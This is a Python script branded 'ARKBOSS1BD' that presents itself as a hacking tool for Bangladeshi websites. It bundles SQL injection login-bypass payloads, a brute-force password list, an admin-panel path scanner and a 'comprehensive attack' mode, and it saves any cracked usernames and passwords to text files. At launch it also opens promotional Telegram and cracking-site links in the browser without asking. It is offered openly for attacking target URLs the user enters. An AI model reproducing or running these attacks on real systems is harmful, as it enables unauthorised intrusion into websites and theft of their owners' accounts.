#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ARKBOSS1BD - Advanced Bangladeshi Website Access Tool
Professional Hacking Tool with Custom Login System
Branding: darkboss1bd
"""

import os
import sys
import time
import requests
import threading
import webbrowser
from datetime import datetime

class ARKBOSS1BD:
    def __init__(self):
        self.version = "v2.0"
        self.brand = "darkboss1bd"
        self.author = "ARKBOSS1BD Team"
        self.telegram_id = "https://t.me/darkvaiadmin"
        self.telegram_channel = "https://t.me/windowspremiumkey"
        self.website = "https://crackyworld.com/"
        
        # SQL Injection payloads
        self.sql_payloads = [
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "' OR ''='",
            "admin' --",
            "' OR 'a'='a",
            "') OR ('1'='1' --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin' OR '1'='1'",
            "' UNION SELECT 1,2,3 --",
            "' AND 1=0 UNION SELECT 1,2,3 --",
            "' OR 1=1 LIMIT 1 --",
            "' OR '1'='1' /*",
            "admin' #",
            "' OR '1'='1' -- -",
            "' OR '1'='1' /*",
            "admin' OR 1=1#",
            "' OR 'x'='x",
            "') OR ('x'='x",
            "' OR 1=1--",
            "' OR 1=1/*",
            "admin' OR '1'='1'--",
            "' OR '1'='1'-- -",
            "' OR 1=1#",
            "admin' OR 1=1#",
            "' OR '1'='1'/*",
            "admin' OR '1'='1'/*",
            "' OR 1=1--",
            "admin' OR 1=1--",
            "' OR '1'='1'--",
            "admin' OR '1'='1'--"
        ]
        
        # Password list
        self.password_list = [
            "admin", "password", "123456", "password123", "admin123",
            "12345678", "123456789", "12345", "1234", "1234567",
            "1234567890", "000000", "111111", "123123", "admin@123",
            "bangladesh", "dhaka", "bd123", "adminbd", "passwordbd",
            "letmein", "welcome", "monkey", "abc123", "qwerty",
            "password1", "123456789", "1234567890", "12345678910",
            "admin@123", "Admin@123", "ADMIN@123", "admin123!@#",
            "root", "toor", "default", "pass", "pass123",
            "bangla", "bangladesh123", "dhaka123", "bd@123",
            "admin@bd", "bdadmin", "bangladesh@123", "dhaka@123"
        ]
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def display_banner(self):
        banner = f"""
\033[1;31m
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║    █████╗ ██████╗ ██╗  ██╗██████╗  ██████╗ ███████╗███████╗   ║
║   ██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔════╝ ██╔════╝██╔════╝   ║
║   ███████║██████╔╝█████╔╝ ██████╔╝██║  ███╗███████╗███████╗   ║
║   ██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██║   ██║╚════██║╚════██║   ║
║   ██║  ██║██║  ██║██║  ██╗██████╔╝╚██████╔╝███████║███████║   ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝   ║
║                                                               ║
║                   Bangladesh 𝔸𝕕𝕧𝕒𝕟𝕔𝕖𝕕 ℍ𝕒𝕔𝕜𝕚𝕟𝕘 𝕋𝕠𝕠𝕝𝕤           ║
║                      𝔹𝕣𝕒𝕟𝕕: {self.brand}                      ║
║                      𝕍𝕖𝕣𝕤𝕚𝕠𝕟: {self.version}                   ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
\033[0m

\033[1;36m[+] Telegram ID: {self.telegram_id}
[+] Telegram Channel: {self.telegram_channel}
[+] Website: {self.website}
[+] Developed by: {self.author}
\033[0m
"""
        print(banner)

    def open_links(self):
        """Automatically open all provided links"""
        print("\033[1;33m[+] Opening provided links...\033[0m")
        links = [self.telegram_id, self.telegram_channel, self.website]
        
        for link in links:
            try:
                webbrowser.open(link)
                print(f"\033[1;32m[✓] Opened: {link}\033[0m")
                time.sleep(1)
            except Exception as e:
                print(f"\033[1;31m[!] Failed to open {link}: {e}\033[0m")

    def sql_injection_attack(self, url, username_field="username", password_field="password"):
        """Perform SQL injection attack"""
        print(f"\033[1;33m[+] Starting SQL Injection attack on: {url}\033[0m")
        
        successful_logins = []
        
        for payload in self.sql_payloads:
            try:
                # Test with common usernames
                test_data = {
                    username_field: payload,
                    password_field: "test"
                }
                
                response = self.session.post(url, data=test_data, timeout=10)
                
                # Check for successful login indicators
                if self.check_login_success(response):
                    successful_logins.append({
                        'url': url,
                        'username': payload,
                        'password': 'SQL Injection',
                        'method': 'SQL Injection'
                    })
                    print(f"\033[1;32m[✓] SQL Injection successful: {payload}\033[0m")
                    
            except Exception as e:
                print(f"\033[1;31m[!] Error with payload {payload}: {e}\033[0m")
                continue
        
        return successful_logins

    def brute_force_attack(self, url, username, username_field="username", password_field="password"):
        """Perform brute force attack with password list"""
        print(f"\033[1;33m[+] Starting brute force attack for user: {username}\033[0m")
        
        for password in self.password_list:
            try:
                login_data = {
                    username_field: username,
                    password_field: password
                }
                
                response = self.session.post(url, data=login_data, timeout=10)
                
                if self.check_login_success(response):
                    print(f"\033[1;32m[✓] Login successful: {username}:{password}\033[0m")
                    return {
                        'url': url,
                        'username': username,
                        'password': password,
                        'method': 'Brute Force'
                    }
                else:
                    print(f"\033[1;31m[✗] Failed: {username}:{password}\033[0m")
                    
            except Exception as e:
                print(f"\033[1;31m[!] Error: {e}\033[0m")
                continue
        
        return None

    def check_login_success(self, response):
        """Check if login was successful based on response"""
        success_indicators = [
            "dashboard", "admin", "welcome", "logout", "success",
            "panel", "control", "manage", "home", "main"
        ]
        
        response_text = response.text.lower()
        
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        # Check status code
        if response.status_code in [200, 302]:
            return True
            
        return False

    def custom_login(self, url, username, password, username_field="username", password_field="password"):
        """Perform custom login attempt"""
        try:
            login_data = {
                username_field: username,
                password_field: password
            }
            
            response = self.session.post(url, data=login_data, timeout=10)
            
            if self.check_login_success(response):
                print(f"\033[1;32m[✓] Custom login successful: {username}:{password}\033[0m")
                return {
                    'url': url,
                    'username': username,
                    'password': password,
                    'method': 'Custom Login'
                }
            else:
                print(f"\033[1;31m[✗] Custom login failed: {username}:{password}\033[0m")
                return None
                
        except Exception as e:
            print(f"\033[1;31m[!] Custom login error: {e}\033[0m")
            return None

    def admin_panel_finder(self, base_url):
        """Find admin panels"""
        print(f"\033[1;33m[+] Scanning for admin panels: {base_url}\033[0m")
        
        admin_paths = [
            "/admin", "/administrator", "/admin/login", "/adminpanel",
            "/wp-admin", "/admincp", "/admin_area", "/backend",
            "/management", "/manager", "/dashboard", "/controlpanel",
            "/admin/login.php", "/admin/index.php", "/admin/admin.php",
            "/admin_area/", "/panel", "/cp", "/admin1", "/admin2",
            "/admin4", "/sysadmin", "/phpmyadmin", "/myadmin"
        ]
        
        found_panels = []
        
        for path in admin_paths:
            try:
                full_url = base_url.rstrip('/') + path
                response = self.session.get(full_url, timeout=5)
                
                if response.status_code == 200:
                    found_panels.append(full_url)
                    print(f"\033[1;32m[✓] Found admin panel: {full_url}\033[0m")
                    
            except Exception as e:
                continue
        
        return found_panels

    def save_results(self, results, filename="hacking_results.txt"):
        """Save successful login results"""
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"ARKBOSS1BD - Hacking Results\n")
            f.write(f"Generated: {datetime.now()}\n")
            f.write(f"Brand: {self.brand}\n")
            f.write("="*50 + "\n\n")
            
            for result in results:
                f.write(f"URL: {result['url']}\n")
                f.write(f"Username: {result['username']}\n")
                f.write(f"Password: {result['password']}\n")
                f.write(f"Method: {result['method']}\n")
                f.write("-" * 30 + "\n")
        
        print(f"\033[1;32m[✓] Results saved to: {filename}\033[0m")

    def display_menu(self):
        """Display main menu"""
        menu = """
\033[1;35m
╔════════════════════════════════════════════════════════════════╗
║                      ARKBOSS1BD MAIN MENU                     ║
╠════════════════════════════════════════════════════════════════╣
║  1. SQL Injection Attack                                      ║
║  2. Brute Force Attack                                        ║
║  3. Custom Login Attack                                       ║
║  4. Admin Panel Finder                                        ║
║  5. Comprehensive Attack (All Methods)                        ║
║  6. Open All Links                                            ║
║  7. Exit                                                      ║
╚════════════════════════════════════════════════════════════════╝
\033[0m
"""
        print(menu)

    def run(self):
        """Main execution function"""
        self.display_banner()
        time.sleep(2)
        
        # Auto-open links
        self.open_links()
        time.sleep(2)
        
        while True:
            self.display_menu()
            choice = input("\033[1;36m[+] Enter your choice (1-7): \033[0m").strip()
            
            if choice == '1':
                self.sql_injection_menu()
            elif choice == '2':
                self.brute_force_menu()
            elif choice == '3':
                self.custom_login_menu()
            elif choice == '4':
                self.admin_finder_menu()
            elif choice == '5':
                self.comprehensive_attack()
            elif choice == '6':
                self.open_links()
            elif choice == '7':
                print("\033[1;33m[!] Thank you for using ARKBOSS1BD Tool!\033[0m")
                break
            else:
                print("\033[1;31m[!] Invalid choice! Please try again.\033[0m")

    def sql_injection_menu(self):
        """SQL Injection attack menu"""
        url = input("\033[1;36m[+] Enter target URL: \033[0m").strip()
        username_field = input("\033[1;36m[+] Enter username field name [username]: \033[0m").strip() or "username"
        password_field = input("\033[1;36m[+] Enter password field name [password]: \033[0m").strip() or "password"
        
        results = self.sql_injection_attack(url, username_field, password_field)
        
        if results:
            self.save_results(results, "sql_injection_results.txt")
        else:
            print("\033[1;31m[!] No successful SQL injections found.\033[0m")

    def brute_force_menu(self):
        """Brute force attack menu"""
        url = input("\033[1;36m[+] Enter target URL: \033[0m").strip()
        username = input("\033[1;36m[+] Enter username to brute force: \033[0m").strip()
        username_field = input("\033[1;36m[+] Enter username field name [username]: \033[0m").strip() or "username"
        password_field = input("\033[1;36m[+] Enter password field name [password]: \033[0m").strip() or "password"
        
        result = self.brute_force_attack(url, username, username_field, password_field)
        
        if result:
            self.save_results([result], "brute_force_results.txt")
        else:
            print("\033[1;31m[!] Brute force attack failed.\033[0m")

    def custom_login_menu(self):
        """Custom login menu"""
        url = input("\033[1;36m[+] Enter target URL: \033[0m").strip()
        username = input("\033[1;36m[+] Enter username: \033[0m").strip()
        password = input("\033[1;36m[+] Enter password: \033[0m").strip()
        username_field = input("\033[1;36m[+] Enter username field name [username]: \033[0m").strip() or "username"
        password_field = input("\033[1;36m[+] Enter password field name [password]: \033[0m").strip() or "password"
        
        result = self.custom_login(url, username, password, username_field, password_field)
        
        if result:
            self.save_results([result], "custom_login_results.txt")
        else:
            print("\033[1;31m[!] Custom login failed.\033[0m")

    def admin_finder_menu(self):
        """Admin panel finder menu"""
        base_url = input("\033[1;36m[+] Enter base URL: \033[0m").strip()
        panels = self.admin_panel_finder(base_url)
        
        if panels:
            with open("admin_panels.txt", 'w') as f:
                for panel in panels:
                    f.write(panel + "\n")
            print(f"\033[1;32m[✓] Found {len(panels)} admin panels. Saved to admin_panels.txt\033[0m")
        else:
            print("\033[1;31m[!] No admin panels found.\033[0m")

    def comprehensive_attack(self):
        """Comprehensive attack using all methods"""
        url = input("\033[1;36m[+] Enter target URL: \033[0m").strip()
        username = input("\033[1;36m[+] Enter username (for brute force): \033[0m").strip()
        username_field = input("\033[1;36m[+] Enter username field name [username]: \033[0m").strip() or "username"
        password_field = input("\033[1;36m[+] Enter password field name [password]: \033[0m").strip() or "password"
        
        all_results = []
        
        print("\033[1;33m[+] Starting comprehensive attack...\033[0m")
        
        # SQL Injection
        sql_results = self.sql_injection_attack(url, username_field, password_field)
        all_results.extend(sql_results)
        
        # Brute Force
        brute_result = self.brute_force_attack(url, username, username_field, password_field)
        if brute_result:
            all_results.append(brute_result)
        
        # Admin Panel Finder
        panels = self.admin_panel_finder(url)
        
        if all_results:
            self.save_results(all_results, "comprehensive_attack_results.txt")
            print(f"\033[1;32m[✓] Comprehensive attack completed. Found {len(all_results)} successful logins.\033[0m")
        else:
            print("\033[1;31m[!] Comprehensive attack completed. No successful logins found.\033[0m")

def main():
    """Main function"""
    try:
        tool = ARKBOSS1BD()
        tool.run()
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Tool interrupted by user. Exiting...\033[0m")
    except Exception as e:
        print(f"\033[1;31m[!] Unexpected error: {e}\033[0m")

if __name__ == "__main__":
    main()
